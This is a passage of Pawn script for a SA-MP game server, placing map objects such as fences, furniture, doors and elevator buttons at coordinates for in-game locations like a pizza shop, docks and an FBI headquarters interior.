		CreateDynamicObject(1544, 2134.89551, -1821.61633, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2134.63208, -1821.60974, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2135.14819, -1821.89502, 12.54600,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1665, 2130.58252, -1820.75720, 13.08500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1667, 2130.40112, -1818.89050, 13.15100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1485, 2130.50049, -1819.17102, 13.10200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(17969, 2123.71802, -1818.86389, 14.19000,   0.00000, 0.00000, 180.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1280, 2091.38354, -1823.58044, 12.94800,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2668, 2119.59790, -1791.04700, 14.42900,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2667, 2114.29102, -1791.04700, 14.43200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2666, 2109.17603, -1791.04700, 14.50000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1793.49695, 12.82100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1796.82104, 12.82100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1799.83691, 12.82100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1814.11401, 12.81500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1817.53796, 12.81500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18014, 2099.18896, -1819.97998, 12.81500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(984, 2099.34082, -1779.67004, 13.02300,   0.00000, 0.00000, -9.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(984, 2101.10303, -1768.50073, 13.02300,   0.00000, 0.00000, -9.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(3749, 2116.90796, -1764.21680, 18.22890,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2105.30469, -1762.19617, 13.07800,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2126.88452, -1762.35217, 13.07800,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2120.47046, -1786.04370, 13.07200,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2101.53662, -1786.04370, 13.07200,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2106.33813, -1786.04370, 13.07200,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2102.01929, -1792.80481, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2103.73755, -1795.59094, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2101.65405, -1797.96423, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2104.01831, -1800.20801, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2103.99902, -1812.06067, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2101.91064, -1814.38098, 13.20400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2103.40967, -1816.85864, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1670, 2102.16113, -1819.58252, 13.30000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1728, 2131.53345, -1817.82458, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1728, 2133.45703, -1822.08667, 12.54500,   0.00000, 0.00000, 179.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2134.89551, -1821.83228, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2134.62573, -1821.80554, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2134.99219, -1822.09900, 12.54600,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2134.75781, -1822.03345, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.33350, -1820.60913, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.30029, -1820.28455, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.45239, -1820.20544, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.47046, -1820.42004, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.30957, -1820.45313, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.50659, -1820.58801, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2131.44141, -1820.72913, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.44971, -1819.37524, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.44971, -1819.51917, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.44971, -1819.69922, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.44971, -1819.86719, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.55762, -1819.60315, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.58179, -1819.37524, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2131.56958, -1819.80725, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.43188, -1819.81897, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.74390, -1819.79504, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2133.05591, -1819.77100, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.74390, -1820.27502, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.43188, -1820.27502, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2133.06787, -1820.27502, 12.54930,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.94800, -1819.77100, 12.68130,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.62378, -1819.79504, 12.68130,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.95996, -1820.27502, 12.68130,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19632, 2132.61182, -1820.27502, 12.68130,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1362, 2134.85571, -1815.76965, 13.13390,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(18659, 2135.34131, -1813.73083, 13.88180,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2123.64478, -1789.21704, 13.07200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2126.87549, -1786.01355, 13.07200,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19123, 2134.83789, -1824.83740, 13.09780,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19123, 2123.88452, -1822.18164, 13.09780,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19123, 2125.46899, -1828.54590, 13.09780,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2125.59302, -1831.62903, 12.85870,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2125.59302, -1831.62903, 13.27870,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1280, 2095.63696, -1811.25940, 12.94800,   0.00000, 0.00000, -90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1280, 2095.63696, -1802.71704, 12.94800,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19122, 2091.77808, -1804.30664, 13.11100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19122, 2091.77808, -1806.90967, 13.11100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19122, 2091.77808, -1809.61121, 13.11100,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2111.22461, -1762.24744, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2111.20459, -1766.20435, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2122.57813, -1762.24829, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2122.57813, -1766.19568, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2123.49219, -1785.88440, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2117.37769, -1785.88440, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2109.37354, -1785.88440, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(19127, 2098.52710, -1785.88440, 12.94320,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1571, 2105.13599, -1765.09326, 13.87200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1415, 2102.22949, -1767.26111, 12.66890,   0.00000, 0.00000, 63.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(646, 2106.07373, -1762.63013, 13.94550,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(646, 2104.40820, -1762.63013, 13.94550,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(646, 2102.55884, -1762.63013, 13.94550,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2101.79956, -1798.30396, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2683, 2101.42383, -1798.31226, 13.41800,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2104.03711, -1800.59351, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2103.73267, -1796.02063, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2102.00903, -1793.37646, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2683, 2103.46631, -1795.98474, 13.41800,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2104.09424, -1812.51294, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2102.29053, -1814.89734, 13.35790,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2103.63696, -1817.35791, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2102.22095, -1819.97327, 13.46590,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2814, 2101.87817, -1814.87671, 13.19570,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2814, 2103.21924, -1817.39526, 13.29170,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2098.22729, -1786.37842, 12.88270,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2098.22729, -1786.94446, 12.88270,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2098.22729, -1787.51636, 12.88270,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2098.22729, -1790.75830, 12.88270,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1238, 2098.22729, -1790.19409, 12.88270,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1408, 2099.83569, -1814.15271, 13.10160,   356.85840, 0.00000, -90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2808, 2107.37061, -1769.47925, 13.00400,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2637, 2105.91479, -1769.47925, 12.39230,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2808, 2104.40796, -1769.47925, 13.00400,   0.00000, 0.00000, -90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2860, 2105.90332, -1769.19373, 12.81710,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2683, 2105.89307, -1770.29993, 12.94920,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2682, 2106.13135, -1770.30115, 12.99620,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1669, 2106.22266, -1769.99304, 12.98360,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1669, 2106.01978, -1769.99304, 12.98360,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1669, 2105.81812, -1769.99304, 12.98360,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2091.67139, -1829.74817, 13.09000,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2091.67651, -1828.76660, 13.09000,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
	//pizzabitis
	//LSPD - LSFMD - All Saints
    CreateDynamicObject(18030, 2092.279296875, 2817.1181640625, -14.807208061218, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2951, 2109.0756835938, 2812.5268554688, -17.188125610352, 0.000000, 0.000000, 270.67498779297); //
    CreateDynamicObject(2951, 2087.53515625, 2803.2150878906, -17.674396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3386, 2103.3381347656, 2830.3115234375, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3387, 2103.4313964844, 2826.3564453125, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3389, 2101.015625, 2830.6564941406, -17.174396514893, 0.000000, 0.000000, 91.894958496094); //
    CreateDynamicObject(1997, 2071.7292480469, 2806.0947265625, -17.174396514893, 0.000000, 0.000000, 93.295013427734); //
    CreateDynamicObject(1997, 2071.7165527344, 2807.8830566406, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(1997, 2071.7561035156, 2809.45703125, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(3384, 2103.1545410156, 2822.3237304688, -15.731789588928, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2100.4477539063, 2827.2509765625, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2100.5051269531, 2822.8688964844, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2094.5844726563, 2825.0227050781, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1796, 2100.0754394531, 2808.0727539063, -17.174396514893, 0.000000, 0.000000, 179.28002929688); //
    CreateDynamicObject(1796, 2098.4482421875, 2808.1791992188, -17.174396514893, 0.000000, 0.000000, 178.9150390625); //
    CreateDynamicObject(1796, 2102.0798339844, 2807.9851074219, -17.174396514893, 0.000000, 0.000000, 179.05505371094); //
    CreateDynamicObject(2239, 2103.4404296875, 2804.8537597656, -17.174396514893, 0.000000, 0.000000, 218.75506591797); //
    CreateDynamicObject(2184, 2085.3012695313, 2828.1159667969, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1671, 2086.1975097656, 2829.4157714844, -16.714181900024, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2190, 2087.134765625, 2828.1010742188, -16.398658752441, 0.000000, 0.000000, 230.5249786377); //
    CreateDynamicObject(2854, 2085.673828125, 2828.6516113281, -16.398658752441, 0.000000, 0.000000, 133.07997131348); //
    CreateDynamicObject(2946, 2081.85546875, 2831.0966796875, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(10182, 1145.3453369141, -1326.4350585938, 14.297383308411, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(16656, 1421.5529785156, -2445.5986328125, -9.6055564880371, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1997, 1430.8905029297, -2437.8049316406, -12.598474502563, 0.000000, 0.000000, 269.9599609375); //
    CreateDynamicObject(3384, 1431.6123046875, -2441.9572753906, -11.155867576599, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1886, 1426.7391357422, -2451.6730957031, -7.6691589355469, 0.000000, 358.01501464844, 182.52499389648); //
    CreateDynamicObject(2951, 1420.4285888672, -2442.7119140625, -13.105556488037, 0.000000, 0.000000, 270.44995117188); //
    CreateDynamicObject(2951, 1420.4750976563, -2450.1713867188, -13.098474502563, 0.000000, 0.000000, 270.53997802734); //
    CreateDynamicObject(2946, 1425.0671386719, -2436.9409179688, -12.605556488037, 0.000000, 0.000000, 268.69006347656); //
    CreateDynamicObject(2606, 1422.2109375, -2436.7719726563, -10.66157245636, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1999, 1421.7412109375, -2437.5876464844, -12.605556488037, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2356, 1422.6676025391, -2438.5456542969, -12.605556488037, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(11008, 1530.6383056641, -2167.5698242188, 19.045516967773, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(8356, 1560.9700927734, -2091.2924804688, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(8356, 1600.9536132813, -2091.2219238281, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(8356, 1501.1728515625, -2091.2724609375, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(5711, 1581.1998291016, -2159.6352539063, 16.031856536865, 0.000000, 0.000000, 180); //
	CreateDynamicObject(16564, 1618.6606445313, -2164.0412597656, 12.494687080383, 0.000000, 0.000000, 90); //
	CreateDynamicObject(8356, 1640.9392089844, -2091.2358398438, 12.568482398987, 0.000000, 0.000000, 179.99450683594); //
	CreateDynamicObject(12839, 1604.3753662109, -2180.419921875, 16.050001144409, 0.000000, 0.000000, 0.000000); //
/*CreateDynamicObject(994, 2222.9479980469, -1707.8178710938, 12.554218292236, 0.000000, 0.000000, 83.25);
	CreateDynamicObject(994, 2222.2282714844, -1714.1044921875, 12.554218292236, 0.000000, 0.000000, 83.248901367188);
	CreateDynamicObject(994, 2221.666015625, -1720.4332275391, 12.554218292236, 0.000000, 0.000000, 84.998901367188);
	CreateDynamicObject(997, 2221.5944824219, -1720.4653320313, 12.554218292236, 0.000000, 0.000000, 270.39489746094);
	CreateDynamicObject(997, 2221.6120605469, -1723.6779785156, 12.554218292236, 0.000000, 0.000000, 308.13818359375);
	CreateDynamicObject(997, 2223.5490722656, -1726.2283935547, 12.554218292236, 0.000000, 0.000000, 343.46838378906);
	CreateDynamicObject(994, 2232.9912109375, -1727.2038574219, 12.554218292236, 0.000000, 0.000000, 179.2939453125);
	CreateDynamicObject(994, 2239.298828125, -1727.1459960938, 12.554218292236, 0.000000, 0.000000, 180.29138183594);
	CreateDynamicObject(994, 2245.6069335938, -1727.1053466797, 12.554218292236, 0.000000, 0.000000, 180.29113769531);
	CreateDynamicObject(994, 2230.0375976563, -1702.1334228516, 12.554218292236, 0.000000, 0.000000, 174.55895996094);
	CreateDynamicObject(994, 2245.8688964844, -1720.8118896484, 12.554218292236, 0.000000, 0.000000, 267.63110351563); */
	CreateDynamicObject(1495, 1582.6011962891, -1637.8992919922, 12.552812576294, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(11326,1604.98535156,-1623.68457031,14.71534920,0.00000000,0.00000000,90.00000000); //object(sfse_hublockup) (1)
	CreateDynamicObject(1886,1581.56628418,-1633.38085938,16.76438522,0.00000000,0.00000000,308.90148926); //object(shop_sec_cam) (1)
	CreateDynamicObject(983, 1544.6878662109, -1620.4252929688, 13.038116455078, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(983, 1544.7156982422, -1635.9808349609, 13.237470626831, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(1344, 1544.7709960938, -1617.0625, 13.191030502319, 0.000000, 0.000000, 180); //
	CreateDynamicObject(13644, 1582.6353759766, -1639.0125732422, 10.541254043579, 0.000000, 19.14501953125, 268.55499267578); //
	//CreateDynamicObject(969, 1635.2663574219, -1852.6921386719, 12.548987388611, 0.000000, 0.000000, 179.99450683594); //
	CreateDynamicObject(1496, 1564.2520751953, -1667.3739013672, 27.395606994629, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(12814, 264.49127197266, 1882.6428222656, 16.587562561035, 0, 0, 0);
	CreateDynamicObject(991, 226.45503234863, 1872.4094238281, 13.949615478516, 0, 0, 270.27062988281);
	CreateDynamicObject(3029, 2175.6774902344, 1594.2722167969, 998.97888183594, 0, 0, 268.69067382813); // Drug Factory Doors
	CreateDynamicObject(10832, 296.68603515625, -1549.5653076172, 77.338836669922, 0.000000, 0.000000, 162.94946289063); //
	CreateDynamicObject(3029, 2223.58203125, 1598.2083740234, 998.9765625, 0, 0, 268.69067382813);
	CreateDynamicObject(3471,1564.04772949,-1881.44250488,13.82141495,0.00000000,0.00000000,90.00000000); // TRIADS object(vgschinalion1) (2)
	CreateDynamicObject(3471,1571.83093262,-1881.41430664,13.82141495,0.00000000,0.00000000,90.00000000); // TRIADS object(vgschinalion1) (3)
	CreateDynamicObject(9482,1567.88854980,-1882.18041992,19.17709923,0.00000000,0.00000000,90.00000000); // TRIADS object(chinagate) (2)

	CreateDynamicObject(2948,968.48669434,-53.18999100,1000.12457275,0.00000000,0.00000000,0.00000000, .interiorid = 3); //object(cr_door_02) (1)
	CreateDynamicObject(2948,968.48632812,-53.18945312,1000.12457275,0.00000000,0.00000000,180.00000000, .interiorid = 3); //object(cr_door_02) (5)
	CreateDynamicObject(2885,968.70294189,-56.50698090,1005.57806396,0.00000000,0.00000000,90.00000000, .interiorid = 3); //object(xref_garagedoor) (1)
	CreateDynamicObject(2714,968.44470215,-53.15001678,1003.11096191,0.00000000,0.00000000,270.00000000, .interiorid = 3); //object(cj_open_sign_2) (1)
	CreateDynamicObject(2885,963.42553711,-56.52644730,1003.82830811,270.00000000,180.69543457,270.69543457, .interiorid = 3); //object(xref_garagedoor) (3)
	CreateDynamicObject(10671,680.26983643,-444.72039795,-24.75238800,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (1)
	CreateDynamicObject(10671,682.69573975,-444.75363159,-24.75238800,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (2)
	CreateDynamicObject(10671,680.79193115,-447.47885132,-26.72739220,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (3)
	CreateDynamicObject(11319,680.67449951,-443.91644287,-26.69394875,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(sprayshpdr2_sfse) (1)

	//--------------- Ocean Docks - Kamyoncu - Jobs - Meslek - Duvarlar - Emir -----------------//

	CreateDynamicObject(7191, 2254.3999, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2209.69995, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2164.69995, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(7191, 2120.6001, -2705.3999, 14.5, 0, 0, 270);
	CreateDynamicObject(8229, 2276.30005, -2694.3999, 15.2, 0, 0, 269.75);
	CreateDynamicObject(8229, 2276.3999, -2682.30005, 15.2, 0, 0, 89.747);

	//---------------FBI HQ Interior--------------------//
 	CreateDynamicObject(1536,293.27246094,-1481.46582031,-34.53342056,0.00000000,0.00000000,179.99450684,1324123, .interiorid = 1); //object(gen_doorext15) (2)
	CreateDynamicObject(1536,290.27832031,-1481.50488281,-34.53342056,0.00000000,0.00000000,0.00000000,1324123, .interiorid = 1); //object(gen_doorext15) (2)
	CreateDynamicObject(1776,291.19232178,-1512.44006348,-45.03078842,0.00000000,0.00000000,90.00000000,1324123, .interiorid = 1); //object(cj_candyvendor) (2)
	FBILobbyLeftBTN[0] = CreateButton(297.66613770,-1498.67749023,-44.59006119,0.79565430); //Lobby Button Left
	FBILobbyLeftBTN[1] = CreateButton(297.24850464,-1498.23107910,-44.59006119,180); //Lobby Button Left
	FBILobbyRightBTN[0] = CreateButton(300.05300903,-1521.40747070,-44.59006119,180); //Lobby Button Right
	FBILobbyRightBTN[1] = CreateButton(300.16033936,-1521.84387207,-44.59006119,0); //Lobby Button Right
	FBIPrivateBTN[0] = CreateButton(298.87384033,-1495.87316895,-27.32773209,270); //Private Office Button
	FBIPrivateBTN[1] = CreateButton(300.49453735,-1495.33837891,-27.28091812,180.49487305); //Private Office Button

	CreateDynamicObject(2886,297.66613770,-1498.67749023,-44.59006119,0,0,0.79565430, 1324123); //Lobby Button Left
	CreateDynamicObject(2886,297.24850464,-1498.23107910,-44.59006119,0,0,180, 1324123); //Lobby Button Left
	CreateDynamicObject(2886,300.05300903,-1521.40747070,-44.59006119,0,0,180, 1324123); //Lobby Button Right
	CreateDynamicObject(2886,300.16033936,-1521.84387207,-44.59006119,0,0,0, 1324123); //Lobby Button Right
	CreateDynamicObject(2886,298.87384033,-1495.87316895,-27.32773209,0,0,270, 1324123); //Private Office Button
	CreateDynamicObject(2886,300.49453735,-1495.33837891,-27.28091812,0,0,180.49487305, 1324123); //Private Office Button

	FBIPrivate[0] = CreateDynamicObject(1536,299.29986572,-1492.82666016,-28.73300552,0.00000000,0.00000000,270.00000000,1324123, .interiorid = 1); //Private Office Door Left
	FBIPrivate[1] = CreateDynamicObject(1536,299.33737183,-1495.83911133,-28.73300552,0.00000000,0.00000000,90.00000000,1324123, .interiorid = 1); //Private Office Door Right
	FBILobbyLeft = CreateDynamicObject(1536,295.40136719,-1498.43457031,-46.13965225,0.00000000,0.00000000,0.00000000,1324123, .interiorid = 1); //Lobby Door Left
	FBILobbyRight = CreateDynamicObject(1536,302.39355469,-1521.62988281,-46.13965225,0.00000000,0.00000000,179.99450684,1324123, .interiorid = 1); //Lobby Door Right

